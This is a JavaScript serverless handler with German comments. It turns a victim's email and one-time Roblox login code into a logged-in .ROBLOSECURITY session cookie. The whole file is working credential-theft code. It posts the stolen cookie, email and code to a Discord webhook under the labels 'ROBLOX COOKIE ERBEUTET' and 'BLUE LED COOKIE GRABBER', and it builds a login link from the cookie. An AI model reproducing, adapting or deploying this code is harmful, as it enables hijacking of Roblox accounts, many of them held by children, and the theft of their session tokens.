// Tauscht den One-Time Code gegen einen .ROBLOSECURITY Cookie
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, code } = req.body;

        if (!email || !code) {
            return res.status(400).json({ error: 'Email and code required' });
        }

        const BOT_COOKIE = process.env.ROBLOX_COOKIE;
        const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

        if (!BOT_COOKIE) {
            return res.status(500).json({ error: 'Bot cookie not configured' });
        }

        // 1. CSRF Token holen
        const csrfResponse = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${BOT_COOKIE}`
            }
        });

        const csrfToken = csrfResponse.headers.get('x-csrf-token');

        if (!csrfToken) {
            return res.status(500).json({ error: 'Failed to get CSRF token' });
        }

        // 2. Mit dem One-Time Code einloggen
        const loginResponse = await fetch('https://auth.roblox.com/v2/login', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${BOT_COOKIE}`,
                'x-csrf-token': csrfToken,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ctype: 'EmailCode',        // Wichtig: EmailCode statt Password!
                cvalue: code,               // Der 6-stellige Code vom User
                rememberMe: true            // Für langlebigen Cookie
            })
        });

        const loginData = await loginResponse.text();
        console.log('Login Response:', loginResponse.status, loginData);

        // 3. .ROBLOSECURITY Cookie aus Headers extrahieren
        const setCookie = loginResponse.headers.get('set-cookie');
        const roblosecurity = setCookie?.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];

        if (!roblosecurity) {
            // Manchmal kommt der Cookie im Response Body
            try {
                const jsonData = JSON.parse(loginData);
                if (jsonData.cookie) {
                    roblosecurity = jsonData.cookie;
                }
            } catch (e) {
                // Ignore
            }
        }

        if (!roblosecurity) {
            return res.status(400).json({ 
                success: false, 
                error: 'Failed to get .ROBLOSECURITY cookie',
                details: loginData
            });
        }

        // 4. An Discord Webhook senden (mit Cookie!)
        if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '🔵 **ROBLOX COOKIE ERBEUTET!**',
                    embeds: [{
                        title: '🎯 Account erfolgreich geentert',
                        color: 0x00a6ff,
                        fields: [
                            { name: '📧 Email', value: email, inline: true },
                            { name: '🔑 Code', value: code, inline: true },
                            { name: '🍪 .ROBLOSECURITY', value: `\`${roblosecurity}\``, inline: false },
                            { name: '🔗 Login URL', value: `https://www.roblox.com/login?cookie=${roblosecurity}`, inline: false }
                        ],
                        footer: { text: 'BLUE LED COOKIE GRABBER' },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }

        // 5. Erfolg zurückgeben (OHNE Cookie im Body - sicherheitshalber)
        res.status(200).json({ 
            success: true, 
            message: 'Cookie successfully obtained and sent to webhook'
        });

    } catch (error) {
        console.error('Exchange Error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}
